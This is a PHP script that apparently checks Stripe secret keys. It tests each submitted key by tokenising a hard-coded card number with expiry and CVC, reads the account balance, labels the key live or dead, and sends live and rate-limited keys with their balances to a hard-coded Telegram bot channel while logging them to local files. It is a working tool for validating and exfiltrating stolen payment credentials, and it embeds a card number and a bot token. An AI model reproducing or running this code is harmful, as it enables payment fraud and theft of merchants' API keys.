<?php
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

function GetStr($string, $start, $end)
{
  $string = ' ' . $string;
  $ini = strpos($string, $start);
  if ($ini == 0) return '';
  $ini += strlen($start);
  $len = strpos($string, $end, $ini) - $ini;
  return trim(strip_tags(substr($string, $ini, $len)));
}
$skval = '100';
    $sk = $_GET['sk'];


############[1 Req]#############

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5314620043757207&card[exp_month]=07&card[exp_year]=2027&card[cvc]=643");
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$r1 = curl_exec($ch);
$msg = Getstr($r1,'"message": "','"');

############[2 Req]#############

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/balance');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
$r2 = curl_exec($ch);
$curr = Getstr($r2,'"currency": "','"');
  $balance = trim(strip_tags(getStr($r2,'{
  "object": "balance",
  "available": [
    {
      "amount":',',')));
$pending = trim(strip_tags(getStr($r2,'"livemode": true,
  "pending": [
    {
      "amount":',',')));
if(strpos($r2,'usd')) {
  $currn = '$';
  $currf = '🇺🇸';
  $currs = 'USD';
  $country = 'United States';
  $pending = $pending / $skval;
  $balance = $balance / $skval;
}
elseif(strpos($r2,'inr')) {
  $currn = '₹';
  $currf = '🇮🇳';
  $currs = 'INR';
  $country = 'India';
  $pending = $pending / $skval;
  $balance = $balance / $skval;
}
elseif(strpos($r2,'cad')) {
  $currn = '$';
  $currf = '🇨🇦';
  $currs = 'CAD';
  $country = 'Canada';
  $pending = $pending / $skval;
  $balance = $balance / $skval;
}
elseif(strpos($r2,'aud')) {
  $currn = 'A$';
  $currf = '🇦🇺';
  $currs = 'AUD';
  $country = 'Australia';
  $pending = $pending / $skval;
  $balance = $balance / $skval;
}
elseif(strpos($r2,'aed')) {
  $currn = 'د.إ';
  $currf = '🇦🇪';
  $currs = 'AED';
  $country = 'United Arab Emirates';
  $pending = $pending / $skval;
  $balance = $balance / $skval;
}
elseif(strpos($r2,'sgd')) {
  $currn = 'S$';
  $currf = '🇸🇬';
  $currs = 'SGD';
  $country = 'Singapore';
  $pending = $pending / $skval;
  $balance = $balance / $skval;
}
elseif(strpos($r2,'nzd')) {
  $currn = '$';
  $currf = '🇳🇿';
  $currs = 'NZD';
  $country = 'New Zealand';
  $pending = $pending / $skval;
  $balance = $balance / $skval;
}
elseif(strpos($r2,'eur')) {
  $currn = '€';
  $currf = '🇪🇺';
  $currs = 'EUR';
  $country = 'European Union';
  $pending = $pending / $skval;
  $balance = $balance / $skval;
}
elseif(strpos($r2,'gbp')) {
  $currn = '£';
  $currf = '🇬🇧';
  $currs = 'GBP';
  $country = 'United Kingdom';
  $pending = $pending / $skval;
  $balance = $balance / $skval;
}
elseif(strpos($r2,'jpy')) {
  $currn = '¥';
  $currf = '🇯🇵';
  $currs = 'JPY';
  $country = 'Japan';
  $pending = $pending / $skval;
  $balance = $balance / $skval;
}
elseif(strpos($r2,'mxn')) {
  $currn = '$';
  $currf = '🇲🇽';
  $currs = 'MXN';
  $country = 'Mexico';
  $pending = $pending / $skval;
  $balance = $balance / $skval;
}
else {
  $pending = $pending / $skval;
  $balance = $balance / $skval;
  $currn = 'N/A';
  $currf = 'N/A';
  $country = 'N/A';
  $currs = $curr;
}

#############SET DESTINATION OF YOUR TG BOT
$botToken = '5962559391:AAErzpu1N9QrF5uMTOYuNzoOeQYk6MHHm2k';
$chatID = '@livedumpedsk';
$chatID2 = '@livedumpedsk';

#############SEND TO TG BOT WHEN RATE LIMITED KEY ⚠️
$rate_limit_message = "*⚜️STATUS: RATE LIMITED KEY ⚠️\r\n⚜️KEY: *`$sk`*\r\n⚜️RESPONSE: Request rate limit exceeded.\r\n⚜️BALANCE: $balance $currn\r\n⚜️PENDING AMOUNT: $pending $currn\r\n⚜️CURRENCY: $currs $currf*";
$sendratelimit = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatID.'&text='.urlencode($rate_limit_message).'&parse_mode=Markdown';

#############SEND TO TG BOT WHEN LIVE KEY ✅
$live_message = "*⚜️STATUS: LIVE KEY ✅\r\n⚜️KEY: *`$sk`*\r\n⚜️RESPONSE: SK LIVE KEY ✅\r\n⚜️BALANCE: $balance $currn\r\n⚜️PENDING AMOUNT: $pending $currn\r\n⚜️CURRENCY: $currs $currf*";
$sendlive = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatID2.'&text='.urlencode($live_message).'&parse_mode=Markdown';

#############[Responses]#############

if (strpos($r1, "rate_limit")) {
  file_get_contents($sendratelimit);
  echo "
   <b>⚜️STATUS: RATE LIMITED KEY ⚠️
  <br>⚜️KEY: <span onclick='copyToClipboard(this)' style='cursor:pointer;'>$sk</span>
  <br>⚜️RESPONSE: Request rate limit exceeded.
  <br>⚜️BALANCE: $balance $currn
  <br>⚜️PENDING AMOUNT: $pending $currn
  <br>⚜️CURRENCY: $currs $currf
  <br>⚜️OWNER ➜ @Saqibpiash</b>
  <br><br>";
  fwrite(fopen('rate_limit.txt', 'a'), "⚜️STATUS: RATE LIMITED KEY ⚠️\n⚜️KEY: $sk\n⚜️RESPONSE: Request rate limit exceeded.\n⚜️BALANCE: $balance $currn\n⚜️PENDING AMOUNT: $pending $currn\n⚜️CURRENCY: $currs $currf\n\n");
}
elseif (strpos($r1, "tok")) {
  file_get_contents($sendlive);
  echo "
   <b>⚜️STATUS: LIVE KEY ✅
  <br>⚜️KEY: <span onclick='copyToClipboard(this)' style='cursor:pointer;'>$sk</span>
  <br>⚜️RESPONSE: SK LIVE KEY: Support Bug Bins ✅
  <br>⚜️BALANCE: $balance $currn
  <br>⚜️PENDING AMOUNT: $pending $currn
  <br>⚜️CURRENCY: $currs $currf
  <br>⚜️OWNER ➜ @Saqibpiash</b>
  <br><br>";
  fwrite(fopen('live_key.txt', 'a'), "⚜️STATUS: LIVE KEY ✅\n⚜️KEY: $sk\n⚜️RESPONSE: SK LIVE KEY: Support Bug Bins ✅\n⚜️BALANCE: $balance $currn\n⚜️PENDING AMOUNT: $pending $currn\n⚜️CURRENCY: $currs $currf\n\n");
}
elseif (strpos($r1, "Your card was declined.")) {
  file_get_contents($sendlive);
  echo "
   <b>⚜️STATUS: LIVE KEY ✅
  <br>⚜️KEY: <span onclick='copyToClipboard(this)' style='cursor:pointer;'>$sk</span>
  <br>⚜️RESPONSE: SK LIVE KEY ✅
  <br>⚜️BALANCE: $balance $currn
  <br>⚜️PENDING AMOUNT: $pending $currn
  <br>⚜️CURRENCY: $currs $currf
  <br>⚜️OWNER ➜ @Saqibpiash</b>
  <br><br>";
  fwrite(fopen('live_key.txt', 'a'), "⚜️STATUS: LIVE KEY ✅\n⚜️KEY: $sk\n⚜️RESPONSE: SK LIVE KEY ✅\n⚜️BALANCE: $balance $currn\n⚜️PENDING AMOUNT: $pending $currn\n⚜️CURRENCY: $currs $currf\n\n");
}
elseif (strpos($r1, "Invalid API Key provided")) {
  echo "
   <b>⚜️STATUS: INVALID KEY ❌
  <br>⚜️KEY: $sk
  <br>⚜️RESPONSE: $msg
  <br>⚜️BALANCE: $balance $currn
  <br>⚜️PENDING AMOUNT: $pending $currn
  <br>⚜️CURRENCY: $currs $currf
  <br>⚜️OWNER ➜ @Saqibpiash</b>
  <br><br>";
}
elseif (strpos($r1, "testmode_charges_only")) {
  echo "
   <b>⚜️STATUS: DEAD KEY ❌
  <br>⚜️KEY: $sk
  <br>⚜️RESPONSE: $msg
  <br>⚜️BALANCE: $balance $currn
  <br>⚜️PENDING AMOUNT: $pending $currn
  <br>⚜️CURRENCY: $currs $currf
  <br>⚜️OWNER ➜ @Saqibpiash</b>
  <br><br>";
}
elseif (strpos($r1, "api_key_expired")) {
  echo "
   <b>⚜️STATUS: EXPIRED KEY ❌
  <br>⚜️KEY: $sk
  <br>⚜️RESPONSE: $msg
  <br>⚜️BALANCE: $balance $currn
  <br>⚜️PENDING AMOUNT: $pending $currn
  <br>⚜️CURRENCY: $currs $currf
  <br>⚜️OWNER ➜ @Saqibpiash</b>
  <br><br>";
}
else {
  echo "
   <b>⚜️STATUS: RESPONSE NOT LISTED ⚠️
  <br>⚜️KEY: $sk
  <br>⚜️RESPONSE: $msg
  <br>⚜️BALANCE: $balance $currn
  <br>⚜️PENDING AMOUNT: $pending $currn
  <br>⚜️CURRENCY: $currs $currf
  <br>⚜️OWNER ➜ @Saqibpiash</b>
  <br><br>";
}

curl_close($ch);
ob_flush();
?>